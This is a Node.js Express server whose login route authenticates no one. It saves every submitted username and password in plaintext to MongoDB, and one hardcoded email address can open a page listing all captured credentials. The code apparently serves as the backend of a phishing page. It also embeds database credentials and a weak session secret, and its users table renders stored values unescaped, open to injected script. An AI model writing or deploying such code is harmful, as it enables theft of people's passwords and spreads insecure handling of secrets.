const express = require("express");
const { MongoClient } = require("mongodb");
const path = require("path");
const session = require("express-session");

const app = express();
const port = 3000;

// ✅ FIXED — added database name "security"
const mongo_uri = `mongodb+srv://imanetidjani:yghcbv@cluster0.apc6t.mongodb.net/security?retryWrites=true&w=majority`;

let usersCollection;

// Connect to MongoDB
async function connectDB() {
  try {
    const client = new MongoClient(mongo_uri);
    await client.connect();

    const db = client.db("security"); // must match the URI
    usersCollection = db.collection("users");

    console.log("✅ Connected to MongoDB Atlas!");
  } catch (err) {
    console.error("❌ MongoDB connection error:", err);
  }
}

connectDB().then(() => {

  // Middleware
  app.use(express.urlencoded({ extended: true }));
  app.use(express.json());

  // Session setup
  app.use(
    session({
      secret: "secret_key",
      resave: false,
      saveUninitialized: true,
    })
  );

  // Serve HTML file
  app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
  });

  // Login POST route
  app.post("/login", async (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
      return res.send("Please fill in all fields.");
    }

    try {
      await usersCollection.insertOne({
        email: username,
        password: password,
        created_at: new Date(),
      });

      req.session.email = username;

      if (username === "imanetidj4@gmail.com") {
        res.redirect("/users");
      } else {
        res.redirect("/");
      }
    } catch (err) {
      console.error("❌ Error saving to MongoDB:", err);
      res.send("Error saving to MongoDB: " + err.message);
    }
  });

  app.get("/users", async (req, res) => {
    if (req.session.email !== "imanetidj4@gmail.com") {
      return res.redirect("/");
    }

    try {
      const allUsers = await usersCollection.find({}).toArray();

      let html = `<h1>All Users</h1>
      <table border="1" cellpadding="5" cellspacing="0">
      <tr><th>Email</th><th>Password</th><th>Created At</th></tr>`;

      allUsers.forEach(user => {
        html += `<tr>
          <td>${user.email}</td>
          <td>${user.password}</td>
          <td>${new Date(user.created_at).toLocaleString()}</td>
        </tr>`;
      });

      html += `</table>`;
      res.send(html);

    } catch (err) {
      console.error("❌ Error fetching users:", err);
      res.status(500).send("Error fetching users");
    }
  });

  app.listen(port, () => {
    console.log(`✅ Server running at http://localhost:${port}`);
  });
});
